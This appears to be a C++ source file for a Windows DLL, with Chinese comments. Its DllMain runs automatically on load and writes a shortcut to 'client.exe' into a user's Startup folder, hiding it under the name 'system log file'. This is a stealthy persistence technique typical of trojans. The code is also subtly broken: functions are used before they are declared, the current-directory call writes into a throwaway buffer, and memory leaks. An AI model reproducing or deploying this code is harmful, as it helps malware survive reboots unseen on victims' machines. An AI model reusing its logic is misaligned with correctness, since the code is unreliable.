// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <Windows.h>
#include <shlobj.h>
#pragma comment(lib, "shell32.lib")

BOOL isRun = false;

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		if (isRun == false)
		{
			char ownfile[MAX_PATH] = "client.exe";
			char linkfile[MAX_PATH] = "系统日志文件.lnk";
			selfStarting(ownfile, linkfile);
		}
		isRun = true;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

// 实现自启动
bool selfStarting(char *selfstartfile, char *linkfile)
{
	char ownFilePath[MAX_PATH] = { 0 }; IShellLink *pisl;

	// 系统自启动目录
	char selfStartFilePath[MAX_PATH] = "C:\\Users\\Cxy\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";

	// 获取当前路径
	GetCurrentDirectory(MAX_PATH, AnsiToUnicode(ownFilePath));
	strcat(ownFilePath, selfstartfile);
	strcat(selfStartFilePath, linkfile);
	// 首先判断快捷方式是否存在, 存在就不添加了
	HANDLE isExist = CreateFile(AnsiToUnicode(selfStartFilePath), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (isExist != INVALID_HANDLE_VALUE)
	{
		CloseHandle(isExist);
		return false;
	}

	HRESULT hr = CoInitialize(NULL);

	hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&pisl);
	if (!SUCCEEDED(hr))
		return false;

	IPersistFile* pIPF;
	pisl->SetPath(AnsiToUnicode(ownFilePath));
	hr = pisl->QueryInterface(IID_IPersistFile, (void **)&pIPF);
	if (!SUCCEEDED(hr))
		return false;

	// 在启动目录创建快捷方式
	pIPF->Save(AnsiToUnicode(selfStartFilePath), FALSE);

	pIPF->Release();
	pisl->Release();
	CoUninitialize();
	return true;
}

wchar_t* AnsiToUnicode(const char* szStr)
{
	int nLen = MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, szStr, -1, NULL, 0);
	if (nLen == 0)
		return NULL;
	wchar_t* pResult = new wchar_t[nLen];
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, szStr, -1, pResult, nLen);
	return pResult;
}

